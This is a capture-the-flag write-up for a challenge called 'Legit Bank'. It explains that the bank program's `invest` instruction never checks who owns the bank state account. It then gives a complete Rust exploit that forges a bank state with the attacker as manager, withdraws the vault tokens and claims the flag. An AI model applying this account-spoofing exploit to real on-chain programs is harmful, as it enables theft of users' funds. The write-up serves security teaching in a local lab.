# Legit Bank

The `invest`-instruction enables the bank manager to withdraw arbitrary funds from the vault, and is obviously only supposed
to let the bank manager withdraw those funds. This is ensured, by checking that `manager_info`'s pubkey matches the bank
manager pubkey on the bank state and that account has signed the transaction:
```rust
// verify that manager is correct
let bank: Bank = Bank::try_from_slice(&bank_info.data.borrow())?;
if bank.manager_key != manager_info.key.to_bytes() {
    return Err(0xbeefbeef.into());
}
```
 
However there are no checks on the bank state
itself. This means we can craft our own bank state by just copying the old bank state, replacing the bank manager with our 
own account, and steal all funds:

```rust
let client = localhost_client();
let payer = read_keypair_file("rich-boi.json").unwrap();
let mut env = RemoteEnvironment::new(localhost_client(), payer);

let bank_program = Pubkey::from_str("Bank111111111111111111111111111111111111111").unwrap();
let flag_mint = Pubkey::from_str("F1agMint11111111111111111111111111111111111").unwrap();
let flag_program = Pubkey::from_str("F1ag111111111111111111111111111111111111111").unwrap();
let fake_manager = keypair(0);
let fake_bank = random_keypair();

// create account to steal token to
let flag_token_acc = env.get_or_create_associated_token_account(&fake_manager, flag_mint);

// fetch bank (by querying for all accounts belonging to the bank program with the correct size)
let (_, bank_account) = client
    .get_program_accounts_with_config(
        &bank_program,
        RpcProgramAccountsConfig {
            filters: Some(vec![RpcFilterType::DataSize(BANK_LEN)]),
            ..RpcProgramAccountsConfig::default()
        },
    )
    .unwrap()[0]
    .clone();

// set manager key to our own key
let mut bank = Bank::try_from_slice(&bank_account.data).unwrap();
bank.manager_key = fake_manager.pubkey().to_bytes();

// write fake bank to chain
env.create_account_with_data(&fake_bank, bank.try_to_vec().unwrap());
println!("written fake bank data to {}", fake_bank.pubkey());

// withdraw token with fake admin key
env.execute_as_transaction(
    &[Instruction {
        program_id: bank_program,
        accounts: vec![
            AccountMeta::new(fake_bank.pubkey(), false),
            AccountMeta::new(Pubkey::new(&bank.vault_key), false),
            AccountMeta::new(Pubkey::new(&bank.vault_authority), false),
            AccountMeta::new(flag_token_acc, false),
            AccountMeta::new_readonly(fake_manager.pubkey(), true),
            AccountMeta::new_readonly(spl_token::ID, false),
        ],
        data: BankInstruction::Invest { amount: 1 }.try_to_vec().unwrap(),
    }],
    &[&fake_manager],
)
.print();

// get flag
env.execute_as_transaction(
    &[Instruction {
        program_id: flag_program,
        accounts: vec![
            AccountMeta::new_readonly(flag_token_acc, false),
            AccountMeta::new_readonly(fake_manager.pubkey(), true),
        ],
        data: vec![],
    }],
    &[&fake_manager],
)
.print_named("flag");
```
